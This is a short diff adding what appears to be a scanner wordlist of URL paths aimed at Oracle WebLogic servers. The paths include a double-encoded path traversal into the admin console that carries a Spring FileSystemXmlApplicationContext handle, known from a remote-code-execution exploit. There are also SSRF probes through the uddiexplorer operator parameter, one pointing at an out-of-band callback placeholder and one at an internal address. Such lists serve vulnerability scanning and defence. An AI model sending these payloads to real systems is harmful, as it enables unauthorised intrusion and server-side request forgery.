@@ -1,0 +1,10 @@
+/ws_utc/config.do
+/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(
+/console/login/LoginForm.jsp
+/manage/fileDownloader?sec=1
+/_async/AsyncResponseService
+/console/images/%252e%252e%252fconsole.portal
+/{{randstr}}
+/uddiexplorer/
+/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{{interactsh-url}}
+/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.1.1.1:700
